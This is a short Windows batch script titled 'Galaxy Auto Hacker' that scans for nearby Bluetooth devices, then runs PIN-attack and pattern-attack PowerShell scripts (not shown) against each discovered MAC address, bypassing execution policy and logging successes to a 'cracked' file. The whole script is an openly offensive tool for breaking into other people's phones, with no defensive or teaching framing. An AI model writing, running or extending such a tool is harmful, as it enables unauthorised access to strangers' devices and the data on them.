@echo off
setlocal enabledelayedexpansion
title Galaxy Auto Hacker (PIN + Pattern)
color 0A

del target_macs.txt 2>nul
del cracked.txt 2>nul
del failed.txt 2>nul

echo [PHASE 1] Scanning Bluetooth devices...
powershell -ExecutionPolicy Bypass -File harvest_macs.ps1

if not exist target_macs.txt (
  echo [ERROR] No targets found.
  pause
  exit /b
)

for /f "tokens=*" %%m in (target_macs.txt) do (
  echo [TARGET] %%m
  powershell -ExecutionPolicy Bypass -File pin_attack.ps1 -TargetMAC %%m
  if !errorlevel! neq 0 (
    powershell -ExecutionPolicy Bypass -File pattern_attack.ps1 -TargetMAC %%m
  )
)
echo [DONE] Results saved to cracked.txt
pause
